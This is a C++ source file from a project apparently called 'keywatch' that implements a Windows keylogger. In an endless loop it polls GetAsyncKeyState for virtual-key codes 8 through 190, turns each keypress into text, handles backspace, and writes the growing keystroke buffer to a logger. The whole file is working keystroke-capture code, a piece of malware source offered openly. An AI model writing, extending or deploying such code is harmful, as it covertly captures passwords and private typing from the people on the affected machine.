#include "keywatch/app/keylogger.hpp"

#include <windows.h>

#include "keywatch/input/key_to_string.hpp"

namespace keywatch::app {

void Keylogger::handle_backspace() {
  if (!storage_.empty()) {
    storage_.pop_back();
  }
}

void Keylogger::run() {
  // Virtual-key codes worth polling span 8 (VK_BACK) to 190 (VK_OEM_PERIOD).
  while (true) {
    for (int key = 8; key <= 190; key++) {
      // 0x0001 = key transitioned to pressed since the last poll.
      if (GetAsyncKeyState(key) & 0x0001) {
        if (key == VK_BACK) {
          handle_backspace();
          logger_.write(storage_);
        } else {
          std::string ks = input::key_to_string(key);
          if (!ks.empty()) {
            storage_ += ks;
            logger_.write(storage_);
          }
        }
      }
    }
  }
}

} // namespace keywatch::app
